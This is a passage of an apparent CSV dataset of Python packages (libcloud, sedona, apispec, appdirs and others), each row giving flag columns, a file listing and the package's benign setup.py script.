allocate_vpc_address.xml associate_address.xml associate_vpc_address.xml attach_internet_gateway.xml attach_network_interface.xml attach_volume.xml authorize_security_group_egress.xml authorize_security_group_ingress.xml copy_image.xml create_encrypted_volume.xml create_image.xml create_internet_gateway.xml create_key_pair.xml create_network_interface.xml create_placement_groups.xml create_security_group.xml create_snapshot.xml create_subnet.xml create_tags.xml create_volume.xml create_vpc.xml delete_internet_gateway.xml delete_key_pair.xml delete_network_interface.xml delete_placement_groups.xml delete_security_group.xml delete_snapshot.xml delete_subnet.xml delete_tags.xml delete_volume.xml delete_vpc.xml deregister_image.xml describe_account_attributes.xml describe_addresses.xml describe_addresses_all.xml describe_addresses_multi.xml describe_addresses_single.xml describe_availability_zones.xml describe_images.xml describe_images_ex_imageids.xml describe_import_snapshot_tasks.xml describe_import_snapshot_tasks_active.xml describe_instances.xml describe_instance_types.xml describe_internet_gateways.xml describe_key_pairs.xml describe_key_pairs_doesnt_exist.xml describe_network_interfaces.xml describe_placement_groups.xml describe_reserved_instances.xml describe_security_groups.xml describe_snapshots.xml describe_subnets.xml describe_tags.xml describe_volumes.xml describe_volumes_modifications.xml describe_vpcs.xml detach_internet_gateway.xml detach_network_interface.xml detach_volume.xml disassociate_address.xml get_console_output.xml import_key_pair.xml import_snapshot.xml modify_image_attribute.xml modify_instance_attribute.xml modify_snapshot_attribute.xml modify_subnet_attribute.xml modify_volume.xml reboot_instances.xml register_image.xml release_address.xml revoke_security_group_egress.xml revoke_security_group_ingress.xml run_instances.xml run_instances_iam_profile.xml run_instances_idem.xml run_instances_idem_mismatch.xml run_instances_spot.xml run_instances_with_subnet_and_security_group.xml start_instances.xml stop_instances.xml terminate_instances.xml htemplate_list.json network_list.json ptemplate_list.json vm_1_action_delete.json vm_1_action_start.json vm_1_action_stop.json vm_1_get.json vm_list.json vm_put.json attach_disk.xml copy_image.xml create_disk.xml create_image.xml create_instance.xml create_node_describe_instances.xml create_public_ip.xml create_security_group.xml create_snapshot.xml create_volume_describe_disks.xml delete_disk.xml delete_image.xml delete_instance.xml delete_security_group_by_id.xml delete_snapshot.xml describe_disks.xml describe_images.xml describe_instances.xml describe_instance_types.xml describe_regions.xml describe_security_groups.xml describe_security_group_attributes.xml describe_snapshots.xml describe_zones.xml destroy_node_describe_instances.xml destroy_volume_describe_disks.xml detach_disk.xml detach_volume_describe_disks.xml get_image_describe_images.xml join_security_group_by_id.xml leave_security_group_by_id.xml modify_security_group_by_id.xml pages_describe_images.xml pages_describe_images_page2.xml reboot_instance.xml reboot_node_describe_instances.xml start_instance.xml stop_instance.xml stop_node_describe_instances.xml drives_create.json drives_info.json offline_servers_info.json servers_create.json servers_info.json associate_ip.json attach_volume.json bgp_config_project_1.json bgp_config_project_2.json bgp_config_project_3.json bgp_sessions.json bgp_session_create.json bgp_session_get.json create_volume.json devices.json devices_for_project.json device_create.json device_events.json facilities.json ip_address.json ip_assignments.json node_bandwidth.json operatingsystems.json plans.json projects.json project_events.json project_ips.json reserve_ip.json sshkeys.json sshkey_create.json volumes.json ex_describe_instance_types.xml ex_describe_product_types.xml ex_describe_quotas.xml ex_get_product_type.xml ex_modify_instance_keypair.xml account_info.xml account_info_rating.xml datacenter_list.xml disk_attach.xml disk_create.xml disk_create_from.xml disk_delete.xml disk_detach.xml disk_info.xml disk_list.xml disk_update.xml iface_attach.xml iface_detach.xml iface_list.xml image_list_dc0.xml ip_list.xml operation_info.xml ssh_delete.xml ssh_info.xml ssh_list.xml vm_create_from.xml vm_delete.xml vm_info.xml vm_list.xml vm_reboot.xml vm_stop.xml aggregated_addresses.json aggregated_autoscalers.json aggregated_disks.json aggregated_disktypes.json aggregated_forwardingRules.json aggregated_instanceGroupManagers.json aggregated_instances.json aggregated_machineTypes.json aggregated_subnetworks.json aggregated_targetInstances.json aggregated_targetPools.json generic_disk.json global_addresses.json global_addresses_lcaddressglobal.json global_addresses_lcaddressglobal_delete.json global_addresses_post.json global_backendServices-empty.json global_backendServices-web-service.json global_backendServices_no_backends.json global_backendServices_post.json global_backendServices_web_service.json global_backendServices_web_service_delete.json global_custom_image_setLabels_post.json global_firewalls.json global_firewalls_lcfirewall-deny.json global_firewalls_lcfirewall-egress.json global_firewalls_lcfirewall.json global_firewalls_lcfirewall_delete.json global_firewalls_lcfirewall_put.json global_firewalls_post.json global_forwardingRules.json global_forwardingRules_http_rule.json global_forwardingRules_http_rule_delete.json global_forwardingRules_post.json global_httpHealthChecks.json global_httpHealthChecks_basic-check.json global_httpHealthChecks_lchealthcheck.json global_httpHealthChecks_lchealthcheck_delete.json global_httpHealthChecks_lchealthcheck_put.json global_httpHealthChecks_libcloud-lb-demo-healthcheck.json global_httpHealthChecks_post.json global_images.json global_images_debian_7_wheezy_v20131014_deprecate.json global_images_debian_7_wheezy_v20131120_delete.json global_images_family_notfound.json global_images_paged.json global_images_post.json global_instanceTemplates.json global_instanceTemplates_insert.json global_instanceTemplates_my_instance_template1.json global_instanceTemplates_my_instance_template_shared_network.json global_networks.json global_networks_cf.json global_networks_custom_network.json global_networks_default.json global_networks_lcnetwork.json global_networks_lcnetwork_delete.json global_networks_libcloud-demo-europe-network.json global_networks_libcloud-demo-network.json global_networks_post.json global_operations_operation_setImageLabels_post.json global_routes.json global_routes_lcdemoroute.json global_routes_lcdemoroute_delete.json global_routes_post.json global_snapshots.json global_snapshots_lcsnapshot.json global_snapshots_lcsnapshot_delete.json global_sslcertificates.json global_sslcertificates_example.json global_sslcertificates_post.json global_targetHttpProxies.json global_targetHttpProxies_post.json global_targetHttpProxies_web_proxy.json global_targetHttpProxies_web_proxy_delete.json global_urlMaps.json global_urlMaps_post.json global_urlMaps_web_map.json global_urlMaps_web_map_delete.json operations_operation_global_addresses_lcaddressglobal_delete.json operations_operation_global_addresses_post.json operations_operation_global_backendServices_post.json operations_operation_global_backendServices_web_service_delete.json operations_operation_global_firewalls_lcfirewall_delete.json operations_operation_global_firewalls_lcfirewall_put.json operations_operation_global_firewalls_post.json operations_operation_global_forwardingRules_http_rule_delete.json operations_operation_global_forwardingRules_post.json operations_operation_global_httpHealthChecks_lchealthcheck_delete.json operations_operation_global_httpHealthChecks_lchealthcheck_put.json operations_operation_global_httpHealthChecks_post.json operations_operation_global_images_debian7_delete.json operations_operation_global_image_post.json operations_operation_global_instanceTemplates_insert.json operations_operation_global_networks_lcnetwork_delete.json operations_operation_global_networks_post.json operations_operation_global_routes_lcdemoroute_delete.json operations_operation_global_routes_post.json operations_operation_global_snapshots_lcsnapshot_delete.json operations_operation_global_sslcertificates_post.json operations_operation_global_targetHttpProxies_post.json operations_operation_global_targetHttpProxies_web_proxy_delete.json operations_operation_global_urlMaps_post.json operations_operation_global_urlMaps_web_map_delete.json operations_operation_regions_us-central1_addresses_lcaddress_delete.json operations_operation_regions_us-central1_addresses_post.json operations_operation_regions_us-central1_forwardingRules_lcforwardingrule_delete.json operations_operation_regions_us-central1_forwardingRules_post.json operations_operation_regions_us-central1_subnetworks_post.json operations_operation_regions_us-central1_targetPools_lb_pool_setBackup_post.json operations_operation_regions_us-central1_targetPools_lctargetpool_addHealthCheck_post.json operations_operation_regions_us-central1_targetPools_lctargetpool_addInstance_post.json operations_operation_regions_us-central1_targetPools_lctargetpool_delete.json operations_operation_regions_us-central1_targetPools_lctargetpool_removeHealthCheck_post.json operations_operation_regions_us-central1_targetPools_lctargetpool_removeInstance_post.json operations_operation_regions_us-central1_targetPools_post.json operations_operation_setCommonInstanceMetadata.json operations_operation_setUsageExportBucket.json operations_operation_zones_europe-west1-a_instances_post.json operations_operation_zones_us-central1-a_disks_lcdisk_createSnapshot_post.json operations_operation_zones_us-central1-a_disks_lcdisk_delete.json operations_operation_zones_us-central1-a_disks_lcdisk_resize_post.json operations_operation_zones_us-central1-a_disks_lcdisk_setLabels_post.json operations_operation_zones_us-central1-a_disks_post.json operations_operation_zones_us-central1-a_instances_lcnode-000_delete.json operations_operation_zones_us-central1-a_instances_lcnode-001_delete.json operations_operation_zones_us-central1-a_instances_node-name_attachDisk_post.json operations_operation_zones_us-central1-a_instances_node-name_delete.json operations_operation_zones_us-central1-a_instances_node-name_detachDisk_pos,"# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements.  See the NOTICE file distributed with
# this work for additional information regarding copyright ownership.
# The ASF licenses this file to You under the Apache License, Version 2.0
# (the ""License""); you may not use this file except in compliance with
# the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import sys
import re
import fnmatch

import setuptools
from setuptools import setup
from distutils.core import Command

try:
    import epydoc  # NOQA

    has_epydoc = True
except ImportError:
    has_epydoc = False

# NOTE: Those functions are intentionally moved in-line to prevent setup.py dependening on any
# Libcloud code which depends on libraries such as typing, enum, requests, etc.
# START: Taken From Twisted Python which licensed under MIT license
# https://github.com/powdahound/twisted/blob/master/twisted/python/dist.py
# https://github.com/powdahound/twisted/blob/master/LICENSE

# Names that are excluded from globbing results:
EXCLUDE_NAMES = [""{arch}"", ""CVS"", "".cvsignore"", ""_darcs"", ""RCS"", ""SCCS"", "".svn""]
EXCLUDE_PATTERNS = [""*.py[cdo]"", ""*.s[ol]"", "".#*"", ""*~"", ""*.py""]


def _filter_names(names):
    """"""
    Given a list of file names, return those names that should be copied.
    """"""
    names = [n for n in names if n not in EXCLUDE_NAMES]
    # This is needed when building a distro from a working
    # copy (likely a checkout) rather than a pristine export:
    for pattern in EXCLUDE_PATTERNS:
        names = [
            n
            for n in names
            if not fnmatch.fnmatch(n, pattern) and not n.endswith("".py"")
        ]
    return names


def relative_to(base, relativee):
    """"""
    Gets 'relativee' relative to 'basepath'.

    i.e.,

    >>> relative_to('/home/', '/home/radix/')
    'radix'
    >>> relative_to('.', '/home/radix/Projects/Twisted')
    'Projects/Twisted'

    The 'relativee' must be a child of 'basepath'.
    """"""
    basepath = os.path.abspath(base)
    relativee = os.path.abspath(relativee)
    if relativee.startswith(basepath):
        relative = relativee[len(basepath) :]
        if relative.startswith(os.sep):
            relative = relative[1:]
        return os.path.join(base, relative)
    raise ValueError(""%s is not a subpath of %s"" % (relativee, basepath))


def get_packages(dname, pkgname=None, results=None, ignore=None, parent=None):
    """"""
    Get all packages which are under dname. This is necessary for
    Python 2.2's distutils. Pretty similar arguments to getDataFiles,
    including 'parent'.
    """"""
    parent = parent or """"
    prefix = []
    if parent:
        prefix = [parent]
    bname = os.path.basename(dname)
    ignore = ignore or []
    if bname in ignore:
        return []
    if results is None:
        results = []
    if pkgname is None:
        pkgname = []
    subfiles = os.listdir(dname)
    abssubfiles = [os.path.join(dname, x) for x in subfiles]

    if ""__init__.py"" in subfiles:
        results.append(prefix + pkgname + [bname])
        for subdir in filter(os.path.isdir, abssubfiles):
            get_packages(
                subdir,
                pkgname=pkgname + [bname],
                results=results,
                ignore=ignore,
                parent=parent,
            )
    res = [""."".join(result) for result in results]
    return res


def get_data_files(dname, ignore=None, parent=None):
    """"""
    Get all the data files that should be included in this distutils Project.

    'dname' should be the path to the package that you're distributing.

    'ignore' is a list of sub-packages to ignore.  This facilitates
    disparate package hierarchies.  That's a fancy way of saying that
    the 'twisted' package doesn't want to include the 'twisted.conch'
    package, so it will pass ['conch'] as the value.

    'parent' is necessary if you're distributing a subpackage like
    twisted.conch.  'dname' should point to 'twisted/conch' and 'parent'
    should point to 'twisted'.  This ensures that your data_files are
    generated correctly, only using relative paths for the first element
    of the tuple ('twisted/conch/*').
    The default 'parent' is the current working directory.
    """"""
    parent = parent or "".""
    ignore = ignore or []
    result = []
    for directory, subdirectories, filenames in os.walk(dname):
        resultfiles = []
        for exname in EXCLUDE_NAMES:
            if exname in subdirectories:
                subdirectories.remove(exname)
        for ig in ignore:
            if ig in subdirectories:
                subdirectories.remove(ig)
        for filename in _filter_names(filenames):
            resultfiles.append(filename)
        if resultfiles:
            for filename in resultfiles:
                file_path = os.path.join(directory, filename)
                if parent:
                    file_path = file_path.replace(parent + os.sep, """")
                result.append(file_path)

    return result


# END: Taken from Twisted


# Different versions of python have different requirements.  We can't use
# libcloud.utils.py3 here because it relies on backports dependency being
# installed / available
PY_pre_36 = sys.version_info < (3, 6, 0)

HTML_VIEWSOURCE_BASE = ""https://svn.apache.org/viewvc/libcloud/trunk""
PROJECT_BASE_DIR = ""https://libcloud.apache.org""
TEST_PATHS = [
    ""libcloud/test"",
    ""libcloud/test/common"",
    ""libcloud/test/compute"",
    ""libcloud/test/storage"",
    ""libcloud/test/loadbalancer"",
    ""libcloud/test/dns"",
    ""libcloud/test/container"",
    ""libcloud/test/backup"",
]
DOC_TEST_MODULES = [
    ""libcloud.compute.drivers.dummy"",
    ""libcloud.storage.drivers.dummy"",
    ""libcloud.dns.drivers.dummy"",
    ""libcloud.container.drivers.dummy"",
    ""libcloud.backup.drivers.dummy"",
]

SUPPORTED_VERSIONS = [""PyPy 3.6+"", ""Python 3.6+""]

# NOTE: python_version syntax is only supported when build system has
# setuptools >= 36.2
# For installation, minimum required pip version is 1.4
# Reference: https://hynek.me/articles/conditional-python-dependencies/
# We rely on >= 2.26.0 to avoid issues with LGPL transitive dependency
# See https://github.com/apache/libcloud/issues/1594 for more context
INSTALL_REQUIREMENTS = []
INSTALL_REQUIREMENTS.append(""requests>=2.26.0"")


setuptools_version = tuple(setuptools.__version__.split(""."")[0:2])
setuptools_version = tuple([int(c) for c in setuptools_version])

if setuptools_version < (36, 2):
    if ""bdist_wheel"" in sys.argv:
        # NOTE: We need to do that because we use universal wheel
        msg = (
            ""Need to use latest version of setuptools when building wheels to ensure included ""
            ""metadata is correct. Current version: %s"" % (setuptools.__version__)
        )
        raise RuntimeError(msg)

TEST_REQUIREMENTS = [
    ""requests_mock"",
    ""pytest"",
    ""pytest-runner"",
] + INSTALL_REQUIREMENTS

if PY_pre_36:
    version = ""."".join([str(x) for x in sys.version_info[:3]])
    print(
        ""Python version %s is not supported. Supported versions are: %s. ""
        ""Latest version which supports Python 2.7 and Python 3 < 3.5.0 is ""
        ""Libcloud v2.8.2 and Libcloud v3.4.0 for Python 3.5.""
        % (version, "", "".join(SUPPORTED_VERSIONS))
    )
    sys.exit(1)


def read_version_string():
    version = None
    cwd = os.path.dirname(os.path.abspath(__file__))
    version_file = os.path.join(cwd, ""libcloud/__init__.py"")

    with open(version_file) as fp:
        content = fp.read()

    match = re.search(r""^__version__ = ['\""]([^'\""]*)['\""]"", content, re.M)

    if match:
        version = match.group(1)
        return version

    raise Exception(""Cannot find version in libcloud/__init__.py"")


def forbid_publish():
    argv = sys.argv
    if ""upload"" in argv:
        print(
            ""You shouldn't use upload command to upload a release to PyPi. ""
            ""You need to manually upload files generated using release.sh ""
            ""script.\n""
            'For more information, see ""Making a release section"" in the '
            ""documentation""
        )
        sys.exit(1)


class ApiDocsCommand(Command):
    description = ""generate API documentation""
    user_options = []

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        if not has_epydoc:
            raise RuntimeError('Missing ""epydoc"" package!')

        os.system(
            ""pydoctor""
            "" --add-package=libcloud""
            "" --project-name=libcloud""
            "" --make-html""
            ' --html-viewsource-base=""%s""'
            "" --project-base-dir=`pwd`""
            ' --project-url=""%s""' % (HTML_VIEWSOURCE_BASE, PROJECT_BASE_DIR)
        )


forbid_publish()

needs_pytest = {""pytest"", ""test"", ""ptr""}.intersection(sys.argv)
pytest_runner = [""pytest-runner""] if needs_pytest else []

setup(
    name=""apache-libcloud"",
    version=read_version_string(),
    description=""A standard Python library that abstracts away differences""
    + "" among multiple cloud provider APIs. For more information""
    + "" and documentation, please see https://libcloud.apache.org"",
    long_description=open(""README.rst"").read(),
    author=""Apache Software Foundation"",
    author_email=""dev@libcloud.apache.org"",
    install_requires=INSTALL_REQUIREMENTS,
    python_requires="">=3.6, <4"",
    packages=get_packages(""libcloud""),
    package_dir={
        ""libcloud"": ""libcloud"",
    },
    package_data={
        ""libcloud"": get_data_files(""libcloud"", parent=""libcloud"") + [""py.typed""],
    },
    license=""Apache License (2.0)"",
    url=""https://libcloud.apache.org/"",
    setup_requires=pytest_runner,
    tests_require=TEST_REQUIREMENTS,
    cmdclass={
        ""apidocs"": ApiDocsCommand,
    },
    zip_safe=False,
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: System Administrators"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
    ],
)
",1
apache-sedona-1.2.0,0,1,1,1,1,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md file_data_splitter.py grid_type.py index_type.py join_build_side.py spatial.py __init__.py disc_utils.py geo_json_reader.py geo_reader.py shape_file_reader.py __init__.py wkb_reader.py wkt_reader.py __init__.py circle.py envelope.py __init__.py abstract.py config.py translate.py __init__.py join_params.py join_query.py join_query_raw.py knn_query.py range_query.py range_query_raw.py rdd.py __init__.py circle_rdd.py linestring_rdd.py point_rdd.py polygon_rdd.py rectangle_rdd.py spatial_rdd.py spatial_rdd_factory.py __init__.py utils.py __init__.py exceptions.py geo_registrator.py java_libs.py __init__.py exceptions.py types.py __init__.py abstract_parser.py adapter.py binary_parser.py decorators.py geometry_adapter.py jvm.py meta.py prep.py serde.py spatial_rdd_parser.py types.py __init__.py version.py __init__.py setup.cfg setup.py,"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at

#   http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from setuptools import setup, find_packages
from os import path
from sedona import version

here = path.abspath(path.dirname(__file__))

with open(""README.md"", ""r"") as fh:
    long_description = fh.read()

setup(
    name='apache-sedona',
    version=version,
    description='Apache Sedona is a cluster computing system for processing large-scale spatial data',
    url='https://sedona.apache.org',
    license=""Apache License v2.0"",
    author='Apache Sedona',
    author_email='dev@sedona.apache.org',
    packages=find_packages(exclude=[""*.tests"", ""*.tests.*"", ""tests.*"", ""tests""]),
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    python_requires='>=3.6',
    install_requires=['attrs', ""shapely""],
    extras_require={""spark"": ['pyspark>=2.3.0']},
    project_urls={
        'Documentation': 'https://sedona.apache.org',
        'Source code': 'https://github.com/apache/incubator-sedona',
        'Bug Reports': 'https://issues.apache.org/jira/projects/SEDONA'
    },
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: Apache Software License""
    ]
)

",1
apiclient-1.0.4,0,1,1,1,1,0,1,0,base.py ratelimiter.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst LICENSE.txt MANIFEST.in PKG-INFO README README.rst setup.cfg setup.py,"#!/usr/bin/env python

import os

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

def path(p):
    return os.path.join(os.path.abspath(os.path.dirname(__file__)), p)

long_description = ''

try:
    long_description += open(path('README.rst')).read()
    long_description += '\n\n' + open(path('CHANGES.rst')).read()
except IOError:
    pass

version = '1.0.4'

requirements = [
    'urllib3',
    'certifi'
]
tests_requirements = requirements + [
    'nose',
]

setup(name='apiclient',
      version=version,
      description=""Framework for making good API client libraries using urllib3."",
      long_description=long_description,
      classifiers=[
          'Environment :: Web Environment',
          'Intended Audience :: Developers',
          'License :: OSI Approved :: MIT License',
          'Operating System :: OS Independent',
          'Programming Language :: Python',
          'Topic :: Internet :: WWW/HTTP',
          'Topic :: Software Development :: Libraries',
      ],
      keywords='api client urllib3 keepalive threadsafe http rest',
      author='Andrey Petrov',
      author_email='andrey.petrov@shazow.net',
      url='https://github.com/shazow/apiclient',
      license='MIT',
      packages=['apiclient'],
      install_requires=requirements,
      tests_require=tests_requirements,
      )
",1
apipkg-3.0.1,0,1,1,1,0,0,1,0,.gitignore LICENSE PKG-INFO pyproject.toml README.rst py.typed _alias_module.py _importing.py _module.py _syncronized.py _version.py __init__.py,,1
apispec-5.2.2,0,1,1,1,1,0,0,0,AUTHORS.rst CHANGELOG.rst CONTRIBUTING.rst api_core.rst api_ext.rst authors.rst changelog.rst conf.py contributing.rst ecosystem.rst index.rst install.rst license.rst make.bat Makefile quickstart.rst special_topics.rst upgrading.rst using_plugins.rst writing_plugins.rst LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py core.py exceptions.py common.py field_converter.py openapi.py schema_resolver.py __init__.py __init__.py plugin.py py.typed utils.py yaml_utils.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt conftest.py schemas.py test_core.py test_ext_marshmallow.py test_ext_marshmallow_common.py test_ext_marshmallow_field.py test_ext_marshmallow_openapi.py test_utils.py test_yaml_utils.py utils.py __init__.py,"import re
from setuptools import setup, find_packages

EXTRAS_REQUIRE = {
    ""marshmallow"": [""marshmallow>=3.13.0""],
    ""yaml"": [""PyYAML>=3.10""],
    ""validation"": [""prance[osv]>=0.11""],
    ""lint"": [
        ""flake8==4.0.1"",
        ""flake8-bugbear==22.4.25"",
        ""pre-commit~=2.4"",
        ""mypy==0.950"",
        ""types-PyYAML"",
    ],
    ""docs"": [
        ""marshmallow>=3.13.0"",
        ""pyyaml==6.0"",
        ""sphinx==4.5.0"",
        ""sphinx-issues==3.0.1"",
        ""sphinx-rtd-theme==1.0.0"",
    ],
}
EXTRAS_REQUIRE[""tests""] = (
    EXTRAS_REQUIRE[""yaml""]
    + EXTRAS_REQUIRE[""validation""]
    + [""marshmallow>=3.13.0"", ""pytest"", ""mock""]
)
EXTRAS_REQUIRE[""dev""] = EXTRAS_REQUIRE[""tests""] + EXTRAS_REQUIRE[""lint""] + [""tox""]


def find_version(fname):
    """"""Attempts to find the version number in the file names fname.
    Raises RuntimeError if not found.
    """"""
    version = """"
    with open(fname) as fp:
        reg = re.compile(r'__version__ = [\'""]([^\'""]*)[\'""]')
        for line in fp:
            m = reg.match(line)
            if m:
                version = m.group(1)
                break
    if not version:
        raise RuntimeError(""Cannot find version information."")
    return version


def read(fname):
    with open(fname) as fp:
        content = fp.read()
    return content


setup(
    name=""apispec"",
    version=find_version(""src/apispec/__init__.py""),
    description=""A pluggable API specification generator. Currently supports the ""
    ""OpenAPI Specification (f.k.a. the Swagger specification)."",
    long_description=read(""README.rst""),
    author=""Steven Loria"",
    author_email=""sloria1@gmail.com"",
    url=""https://github.com/marshmallow-code/apispec"",
    packages=find_packages(""src""),
    package_dir={"""": ""src""},
    include_package_data=True,
    extras_require=EXTRAS_REQUIRE,
    license=""MIT"",
    zip_safe=False,
    keywords=""apispec swagger openapi specification oas documentation spec rest api"",
    python_requires="">=3.7"",
    classifiers=[
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: 3 :: Only"",
    ],
    test_suite=""tests"",
    project_urls={
        ""Funding"": ""https://opencollective.com/marshmallow"",
        ""Issues"": ""https://github.com/marshmallow-code/apispec/issues"",
        ""Tidelift"": ""https://tidelift.com/subscription/pkg/pypi-apispec?utm_source=pypi-apispec&utm_medium=pypi"",  # noqa: B950,E501
    },
)
",1
apispec-webframeworks-0.5.2,0,1,1,1,1,0,0,0,PKG-INFO README.rst setup.cfg setup.py bottle.py flask.py test_ext_bottle.py test_ext_flask.py test_ext_tornado.py utils.py __init__.py tornado.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt,"from setuptools import setup, find_packages

VERSION = ""0.5.2""
EXTRAS_REQUIRE = {
    ""tests"": [""pytest"", ""mock"", ""Flask==1.1.1"", ""tornado"", ""bottle==0.12.17""],
    ""lint"": [""flake8==3.7.9"", ""flake8-bugbear==19.8.0"", ""pre-commit~=1.18""],
}
EXTRAS_REQUIRE[""dev""] = EXTRAS_REQUIRE[""tests""] + EXTRAS_REQUIRE[""lint""] + [""tox""]


def read(fname):
    with open(fname) as fp:
        content = fp.read()
    return content


setup(
    name=""apispec-webframeworks"",
    version=VERSION,
    description=""Web framework plugins for apispec."",
    long_description=read(""README.rst""),
    author=""Steven Loria"",
    author_email=""sloria1@gmail.com"",
    url=""https://github.com/marshmallow-code/apispec-webframeworks"",
    packages=find_packages(""src""),
    package_dir={"""": ""src""},
    include_package_data=True,
    install_requires=[""apispec[yaml]>=2.0.0""],
    python_requires="">=3.6"",
    extras_require=EXTRAS_REQUIRE,
    license=""MIT"",
    zip_safe=False,
    keywords=(
        ""apispec"",
        ""swagger"",
        ""openapi"",
        ""specification"",
        ""documentation"",
        ""spec"",
        ""rest"",
        ""api"",
        ""web"",
        ""flask"",
        ""tornado"",
        ""bottle"",
        ""frameworks"",
    ),
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Natural Language :: English"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
    ],
    test_suite=""tests"",
    project_urls={
        ""Funding"": ""https://opencollective.com/marshmallow"",
        ""Issues"": ""https://github.com/marshmallow-code/apispec-webframeworks/issues"",
    },
)
",1
aplus-0.11.0,0,1,0,1,0,0,1,0,__init__.py PKG-INFO setup.py,"# coding=utf-8
from distutils.core import setup

setup(
    name=""aplus"",
    version=""0.11.0"",
    packages=['aplus'],
    author=u""Michael M. Tiller"",
    author_email=""michael.tiller@gmail.com""
)
",1
apns2-0.7.2,0,1,1,0,1,0,0,0,client.py credentials.py errors.py payload.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py eckey.pem test_client.py test_credentials.py test_payload.py,"#!/usr/bin/env python

from setuptools import setup

setup(
    name='apns2',
    version='0.7.2',
    packages=['apns2'],
    install_requires=[
        'hyper>=0.7',
        'PyJWT>=1.4.0,<2.0.0',
        'cryptography>=1.7.2',
    ],
    extras_require={
        ""tests"": [
            'freezegun',
            'pytest',
        ],
    },
    url='https://github.com/Pr0Ger/PyAPNs2',
    license='MIT',
    author='Sergey Petrov',
    author_email='me@pr0ger.prg',
    classifiers=[
        'Development Status :: 4 - Beta',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development :: Libraries',
    ],
    description='A python library for interacting with the Apple Push Notification Service via HTTP/2 protocol'
)
",1
appdirs-1.4.4,0,1,1,1,0,0,0,0,.gitignore .travis.yml dependency_links.txt PKG-INFO SOURCES.txt top_level.txt appdirs.py CHANGES.rst Dockerfile HACKING.md LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_api.py __init__.py TODO.md tox.ini,"#!/usr/bin/env python
import sys
import os
import os.path
# appdirs is a dependency of setuptools, so allow installing without it.
try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup
import ast

tests_require = []
if sys.version_info < (2, 7):
    tests_require.append(""unittest2"")


def read(fname):
    inf = open(os.path.join(os.path.dirname(__file__), fname))
    out = ""\n"" + inf.read().replace(""\r\n"", ""\n"")
    inf.close()
    return out


# Do not import `appdirs` yet, lest we import some random version on sys.path.
for line in read(""appdirs.py"").splitlines():
    if line.startswith(""__version__""):
        version = ast.literal_eval(line.split(""="", 1)[1].strip())
        break


setup(
    name='appdirs',
    version=version,
    description='A small Python module for determining appropriate ' + \
        'platform-specific dirs, e.g. a ""user data dir"".',
    long_description=read('README.rst') + '\n' + read('CHANGES.rst'),
    classifiers=[c.strip() for c in """"""
        Development Status :: 5 - Production/Stable
        Intended Audience :: Developers
        License :: OSI Approved :: MIT License
        Operating System :: OS Independent
        Programming Language :: Python :: 2
        Programming Language :: Python :: 2.7
        Programming Language :: Python :: 3
        Programming Language :: Python :: 3.4
        Programming Language :: Python :: 3.5
        Programming Language :: Python :: 3.6
        Programming Language :: Python :: 3.7
        Programming Language :: Python :: 3.8
        Programming Language :: Python :: Implementation :: PyPy
        Programming Language :: Python :: Implementation :: CPython
        Topic :: Software Development :: Libraries :: Python Modules
        """""".split('\n') if c.strip()],
    test_suite='test.test_api',
    tests_require=tests_require,
    keywords='application directory log cache user',
    author='Trent Mick',
    author_email='trentm@gmail.com',
    maintainer='Jeff Rouse',
    maintainer_email='jr@its.to',
    url='http://github.com/ActiveState/appdirs',
    license='MIT',
    py_modules=[""appdirs""],
)
",1
